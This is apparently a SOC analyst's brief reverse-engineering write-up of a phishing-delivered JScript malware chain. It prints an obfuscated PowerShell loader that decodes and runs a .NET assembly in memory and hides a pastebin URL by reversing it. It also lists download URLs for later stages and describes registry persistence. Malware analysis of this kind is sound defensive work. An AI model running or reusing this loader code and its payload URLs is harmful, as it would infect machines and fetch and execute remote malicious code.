# Malware reverse

SOC Analyst: MauriceLambert mauricelambert434@gmail.com

## Context

The malware was sent by email Phishing.

## Steps

1. Start the JScript script
2. Get on https://pastebin.com/raw/AjnLbCjK the following URL https://wtools.io/code/dl/bNGX
3. Create the powershell payload:

```powershell
$YgNut = "https://wtools.io/code/dl/bNGX";
$YgNut = $YgNut.Replace('↓:↓', 'A');
[Byte[]] $dVqHc = [System.Convert]::FromBase64String( $YgNut );
[System.AppDomain]::CurrentDomain.Load($dVqHc).GetType('ClassLibrary3.Class1').GetMethod('prFVI').Invoke($null, [object[]] ('hgyMdbwq/war/moc.nibetsap//:sptth' , '' , 'true' ) ); // 'hgyMdbwq/war/moc.nibetsap//:sptth'[::-1] -> 'https://pastebin.com/raw/qwbdMygh' get on the URL -> https://wtools.io/code/dl/bOhE
```

4. Execute: `powershell -command <payload>`
5. Dowload `fgfgjh.txt` from `https://wtools.io/code/dl/bNGX`
6. Execute the DLL functions from powershell
7. Deobfuscate/decrypt the payload
8. Download some file like: `yuyuuu.txt` from `https://wtools.io/code/dl/bOhE`
9. Save downloaded contents in a temp file
10. The tempfiles are 2 powershell scripts
11. Execute the first script to create persistance using registry key
12. The second script is the malware and contains a new dotnet DLL
